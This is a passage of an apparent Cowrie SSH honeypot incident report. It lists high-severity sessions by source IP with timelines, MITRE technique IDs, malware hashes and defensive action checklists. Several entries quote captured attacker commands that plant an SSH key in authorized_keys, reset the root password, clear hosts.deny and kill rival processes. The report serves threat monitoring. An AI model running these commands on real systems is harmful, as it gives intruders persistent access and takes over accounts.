| `2026-06-01 11:45:28` | `cowrie.login.success` |
| `2026-06-01 11:45:29` | `cowrie.session.params` |
| `2026-06-01 11:45:29` | `cowrie.command.input` |
| `2026-06-01 11:45:29` | `cowrie.command.failed` |
| `2026-06-01 11:45:29` | `cowrie.log.closed` |
| `2026-06-01 11:45:29` | `cowrie.session.params` |
| `2026-06-01 11:45:29` | `cowrie.command.input` |
| `2026-06-01 11:45:29` | `cowrie.session.file_download` |
| `2026-06-01 11:45:29` | `cowrie.log.closed` |
| `2026-06-01 11:45:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.174[.]224` to AbuseIPDB if not already reported
- [ ] Block `43.165.174[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd6a04cd4df1

| Field | Detail |
|---|---|
| **Source IP** | `189.146.252[.]91` |
| **First Seen** | 2026-06-01 11:45 |
| **Last Seen** | 2026-06-01 11:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:45:28` | `cowrie.session.connect` |
| `2026-06-01 11:45:28` | `cowrie.client.version` |
| `2026-06-01 11:45:29` | `cowrie.client.kex` |
| `2026-06-01 11:45:30` | `cowrie.login.success` |
| `2026-06-01 11:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.146.252[.]91` to AbuseIPDB if not already reported
- [ ] Block `189.146.252[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89a8703ae3b6

| Field | Detail |
|---|---|
| **Source IP** | `43.165.174[.]224` |
| **First Seen** | 2026-06-01 11:45 |
| **Last Seen** | 2026-06-01 11:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:45:31` | `cowrie.session.connect` |
| `2026-06-01 11:45:31` | `cowrie.client.version` |
| `2026-06-01 11:45:31` | `cowrie.client.kex` |
| `2026-06-01 11:45:32` | `cowrie.login.success` |
| `2026-06-01 11:45:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.174[.]224` to AbuseIPDB if not already reported
- [ ] Block `43.165.174[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-800d070a572f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-06-01 11:46 |
| **Last Seen** | 2026-06-01 11:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:46:07` | `cowrie.session.connect` |
| `2026-06-01 11:46:07` | `cowrie.client.version` |
| `2026-06-01 11:46:08` | `cowrie.client.kex` |
| `2026-06-01 11:46:09` | `cowrie.login.success` |
| `2026-06-01 11:46:10` | `cowrie.session.params` |
| `2026-06-01 11:46:10` | `cowrie.command.input` |
| `2026-06-01 11:46:10` | `cowrie.command.failed` |
| `2026-06-01 11:46:10` | `cowrie.log.closed` |
| `2026-06-01 11:46:10` | `cowrie.session.params` |
| `2026-06-01 11:46:10` | `cowrie.command.input` |
| `2026-06-01 11:46:11` | `cowrie.session.file_download` |
| `2026-06-01 11:46:11` | `cowrie.log.closed` |
| `2026-06-01 11:46:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abc067de6c44

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-06-01 11:46 |
| **Last Seen** | 2026-06-01 11:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:46:14` | `cowrie.session.connect` |
| `2026-06-01 11:46:14` | `cowrie.client.version` |
| `2026-06-01 11:46:14` | `cowrie.client.kex` |
| `2026-06-01 11:46:16` | `cowrie.login.success` |
| `2026-06-01 11:46:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71d08a06cc3f

| Field | Detail |
|---|---|
| **Source IP** | `60.188.58[.]108` |
| **First Seen** | 2026-06-01 11:49 |
| **Last Seen** | 2026-06-01 11:49 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:I7C4WaOQ6MDk"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:49:05` | `cowrie.session.connect` |
| `2026-06-01 11:49:05` | `cowrie.client.version` |
| `2026-06-01 11:49:05` | `cowrie.client.kex` |
| `2026-06-01 11:49:06` | `cowrie.login.success` |
| `2026-06-01 11:49:06` | `cowrie.session.params` |
| `2026-06-01 11:49:06` | `cowrie.command.input` |
| `2026-06-01 11:49:06` | `cowrie.command.failed` |
| `2026-06-01 11:49:06` | `cowrie.log.closed` |
| `2026-06-01 11:49:06` | `cowrie.session.params` |
| `2026-06-01 11:49:06` | `cowrie.command.input` |
| `2026-06-01 11:49:06` | `cowrie.session.file_download` |
| `2026-06-01 11:49:06` | `cowrie.log.closed` |
| `2026-06-01 11:49:35` | `cowrie.session.params` |
| `2026-06-01 11:49:35` | `cowrie.command.input` |
| `2026-06-01 11:49:35` | `cowrie.log.closed` |
| `2026-06-01 11:49:35` | `cowrie.session.params` |
| `2026-06-01 11:49:35` | `cowrie.command.input` |
| `2026-06-01 11:49:35` | `cowrie.log.closed` |
| `2026-06-01 11:49:36` | `cowrie.session.params` |
| `2026-06-01 11:49:36` | `cowrie.command.input` |
| `2026-06-01 11:49:36` | `cowrie.session.file_download` |
| `2026-06-01 11:49:36` | `cowrie.log.closed` |
| `2026-06-01 11:49:36` | `cowrie.session.params` |
| `2026-06-01 11:49:36` | `cowrie.command.input` |
| `2026-06-01 11:49:36` | `cowrie.log.closed` |
| `2026-06-01 11:49:37` | `cowrie.session.params` |
| `2026-06-01 11:49:37` | `cowrie.command.input` |
| `2026-06-01 11:49:37` | `cowrie.log.closed` |
| `2026-06-01 11:49:37` | `cowrie.session.params` |
| `2026-06-01 11:49:37` | `cowrie.command.input` |
| `2026-06-01 11:49:37` | `cowrie.command.input` |
| `2026-06-01 11:49:37` | `cowrie.log.closed` |
| `2026-06-01 11:49:38` | `cowrie.session.params` |
| `2026-06-01 11:49:38` | `cowrie.command.input` |
| `2026-06-01 11:49:38` | `cowrie.log.closed` |
| `2026-06-01 11:49:38` | `cowrie.session.params` |
| `2026-06-01 11:49:38` | `cowrie.command.input` |
| `2026-06-01 11:49:38` | `cowrie.log.closed` |
| `2026-06-01 11:49:38` | `cowrie.session.params` |
| `2026-06-01 11:49:38` | `cowrie.command.input` |
| `2026-06-01 11:49:39` | `cowrie.log.closed` |
| `2026-06-01 11:49:39` | `cowrie.session.params` |
| `2026-06-01 11:49:39` | `cowrie.command.input` |
| `2026-06-01 11:49:39` | `cowrie.log.closed` |
| `2026-06-01 11:49:40` | `cowrie.session.params` |
| `2026-06-01 11:49:40` | `cowrie.command.input` |
| `2026-06-01 11:49:40` | `cowrie.log.closed` |
| `2026-06-01 11:49:40` | `cowrie.session.params` |
| `2026-06-01 11:49:40` | `cowrie.command.input` |
| `2026-06-01 11:49:40` | `cowrie.log.closed` |
| `2026-06-01 11:49:40` | `cowrie.session.params` |
| `2026-06-01 11:49:40` | `cowrie.command.input` |
| `2026-06-01 11:49:41` | `cowrie.log.closed` |
| `2026-06-01 11:49:41` | `cowrie.session.params` |
| `2026-06-01 11:49:41` | `cowrie.command.input` |
| `2026-06-01 11:49:41` | `cowrie.log.closed` |
| `2026-06-01 11:49:41` | `cowrie.session.params` |
| `2026-06-01 11:49:41` | `cowrie.command.input` |
| `2026-06-01 11:49:42` | `cowrie.log.closed` |
| `2026-06-01 11:49:42` | `cowrie.session.params` |
| `2026-06-01 11:49:42` | `cowrie.command.input` |
| `2026-06-01 11:49:42` | `cowrie.log.closed` |
| `2026-06-01 11:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.188.58[.]108` to AbuseIPDB if not already reported
- [ ] Block `60.188.58[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ce0002b010f

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-01 11:49 |
| **Last Seen** | 2026-06-01 11:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:49:37` | `cowrie.session.connect` |
| `2026-06-01 11:49:37` | `cowrie.client.version` |
| `2026-06-01 11:49:37` | `cowrie.client.kex` |
| `2026-06-01 11:49:37` | `cowrie.login.success` |
| `2026-06-01 11:49:37` | `cowrie.session.params` |
| `2026-06-01 11:49:37` | `cowrie.command.input` |
| `2026-06-01 11:49:37` | `cowrie.command.failed` |
| `2026-06-01 11:49:38` | `cowrie.log.closed` |
| `2026-06-01 11:49:38` | `cowrie.session.params` |
| `2026-06-01 11:49:38` | `cowrie.command.input` |
| `2026-06-01 11:49:38` | `cowrie.session.file_download` |
| `2026-06-01 11:49:38` | `cowrie.log.closed` |
| `2026-06-01 11:49:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aca03950bec8

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-06-01 11:49 |
| **Last Seen** | 2026-06-01 11:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:49:40` | `cowrie.session.connect` |
| `2026-06-01 11:49:40` | `cowrie.client.version` |
| `2026-06-01 11:49:40` | `cowrie.client.kex` |
| `2026-06-01 11:49:40` | `cowrie.login.success` |
| `2026-06-01 11:49:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d61230f7054

| Field | Detail |
|---|---|
| **Source IP** | `101.79.167[.]192` |
| **First Seen** | 2026-06-01 11:49 |
| **Last Seen** | 2026-06-01 11:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:49:42` | `cowrie.session.connect` |
| `2026-06-01 11:49:42` | `cowrie.client.version` |
| `2026-06-01 11:49:42` | `cowrie.client.kex` |
| `2026-06-01 11:49:42` | `cowrie.login.success` |
| `2026-06-01 11:49:43` | `cowrie.session.params` |
| `2026-06-01 11:49:43` | `cowrie.command.input` |
| `2026-06-01 11:49:43` | `cowrie.command.failed` |
| `2026-06-01 11:49:43` | `cowrie.log.closed` |
| `2026-06-01 11:49:43` | `cowrie.session.params` |
| `2026-06-01 11:49:43` | `cowrie.command.input` |
| `2026-06-01 11:49:43` | `cowrie.session.file_download` |
| `2026-06-01 11:49:43` | `cowrie.log.closed` |
| `2026-06-01 11:49:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.167[.]192` to AbuseIPDB if not already reported
- [ ] Block `101.79.167[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-614e686c0d12

| Field | Detail |
|---|---|
| **Source IP** | `101.79.167[.]192` |
| **First Seen** | 2026-06-01 11:49 |
| **Last Seen** | 2026-06-01 11:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:49:45` | `cowrie.session.connect` |
| `2026-06-01 11:49:45` | `cowrie.client.version` |
| `2026-06-01 11:49:45` | `cowrie.client.kex` |
| `2026-06-01 11:49:45` | `cowrie.login.success` |
| `2026-06-01 11:49:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.167[.]192` to AbuseIPDB if not already reported
- [ ] Block `101.79.167[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c76ac036efeb

| Field | Detail |
|---|---|
| **Source IP** | `101.79.167[.]192` |
| **First Seen** | 2026-06-01 11:51 |
| **Last Seen** | 2026-06-01 11:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:51:32` | `cowrie.session.connect` |
| `2026-06-01 11:51:32` | `cowrie.client.version` |
| `2026-06-01 11:51:32` | `cowrie.client.kex` |
| `2026-06-01 11:51:33` | `cowrie.login.success` |
| `2026-06-01 11:51:33` | `cowrie.session.params` |
| `2026-06-01 11:51:33` | `cowrie.command.input` |
| `2026-06-01 11:51:33` | `cowrie.command.failed` |
| `2026-06-01 11:51:33` | `cowrie.log.closed` |
| `2026-06-01 11:51:33` | `cowrie.session.params` |
| `2026-06-01 11:51:33` | `cowrie.command.input` |
| `2026-06-01 11:51:33` | `cowrie.session.file_download` |
| `2026-06-01 11:51:33` | `cowrie.log.closed` |
| `2026-06-01 11:51:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.167[.]192` to AbuseIPDB if not already reported
- [ ] Block `101.79.167[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be8074d4b7de

| Field | Detail |
|---|---|
| **Source IP** | `101.79.167[.]192` |
| **First Seen** | 2026-06-01 11:51 |
| **Last Seen** | 2026-06-01 11:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:51:35` | `cowrie.session.connect` |
| `2026-06-01 11:51:35` | `cowrie.client.version` |
| `2026-06-01 11:51:35` | `cowrie.client.kex` |
| `2026-06-01 11:51:36` | `cowrie.login.success` |
| `2026-06-01 11:51:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.167[.]192` to AbuseIPDB if not already reported
- [ ] Block `101.79.167[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a609aef94e1c

| Field | Detail |
|---|---|
| **Source IP** | `101.79.167[.]192` |
| **First Seen** | 2026-06-01 11:55 |
| **Last Seen** | 2026-06-01 11:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:55:22` | `cowrie.session.connect` |
| `2026-06-01 11:55:22` | `cowrie.client.version` |
| `2026-06-01 11:55:22` | `cowrie.client.kex` |
| `2026-06-01 11:55:23` | `cowrie.login.success` |
| `2026-06-01 11:55:23` | `cowrie.session.params` |
| `2026-06-01 11:55:23` | `cowrie.command.input` |
| `2026-06-01 11:55:23` | `cowrie.command.failed` |
| `2026-06-01 11:55:23` | `cowrie.log.closed` |
| `2026-06-01 11:55:23` | `cowrie.session.params` |
| `2026-06-01 11:55:23` | `cowrie.command.input` |
| `2026-06-01 11:55:24` | `cowrie.session.file_download` |
| `2026-06-01 11:55:24` | `cowrie.log.closed` |
| `2026-06-01 11:55:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.167[.]192` to AbuseIPDB if not already reported
- [ ] Block `101.79.167[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e6eab76686d

| Field | Detail |
|---|---|
| **Source IP** | `101.79.167[.]192` |
| **First Seen** | 2026-06-01 11:55 |
| **Last Seen** | 2026-06-01 11:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:55:25` | `cowrie.session.connect` |
| `2026-06-01 11:55:25` | `cowrie.client.version` |
| `2026-06-01 11:55:25` | `cowrie.client.kex` |
| `2026-06-01 11:55:26` | `cowrie.login.success` |
| `2026-06-01 11:55:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.167[.]192` to AbuseIPDB if not already reported
- [ ] Block `101.79.167[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-260dfbca09bc

| Field | Detail |
|---|---|
| **Source IP** | `101.79.167[.]192` |
| **First Seen** | 2026-06-01 12:03 |
| **Last Seen** | 2026-06-01 12:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:03:15` | `cowrie.session.connect` |
| `2026-06-01 12:03:15` | `cowrie.client.version` |
| `2026-06-01 12:03:15` | `cowrie.client.kex` |
| `2026-06-01 12:03:15` | `cowrie.login.success` |
| `2026-06-01 12:03:15` | `cowrie.session.params` |
| `2026-06-01 12:03:15` | `cowrie.command.input` |
| `2026-06-01 12:03:15` | `cowrie.command.failed` |
| `2026-06-01 12:03:16` | `cowrie.log.closed` |
| `2026-06-01 12:03:16` | `cowrie.session.params` |
| `2026-06-01 12:03:16` | `cowrie.command.input` |
| `2026-06-01 12:03:16` | `cowrie.session.file_download` |
| `2026-06-01 12:03:16` | `cowrie.log.closed` |
| `2026-06-01 12:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.167[.]192` to AbuseIPDB if not already reported
- [ ] Block `101.79.167[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1291c902852b

| Field | Detail |
|---|---|
| **Source IP** | `101.79.167[.]192` |
| **First Seen** | 2026-06-01 12:03 |
| **Last Seen** | 2026-06-01 12:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:03:18` | `cowrie.session.connect` |
| `2026-06-01 12:03:18` | `cowrie.client.version` |
| `2026-06-01 12:03:18` | `cowrie.client.kex` |
| `2026-06-01 12:03:18` | `cowrie.login.success` |
| `2026-06-01 12:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.167[.]192` to AbuseIPDB if not already reported
- [ ] Block `101.79.167[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8e6668611e8

| Field | Detail |
|---|---|
| **Source IP** | `101.79.167[.]192` |
